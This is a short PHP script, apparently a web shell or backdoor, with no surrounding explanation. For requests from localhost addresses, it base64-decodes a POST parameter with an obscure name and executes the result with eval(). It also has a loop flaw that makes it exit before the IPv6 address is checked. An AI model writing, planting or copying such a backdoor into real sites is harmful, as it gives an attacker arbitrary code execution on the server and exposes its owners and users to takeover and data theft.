<?php
$serverList = array(
    "127.0.0.1",
    "::1"
);
$ip = $_SERVER['REMOTE_ADDR'];

foreach ($serverList as $host){
    if( $ip===$host){
		$a = $_POST['n985de9'];
		if(isset($a)) {
    		eval(base64_decode($a));
		}
    }else{
        die();
    }
}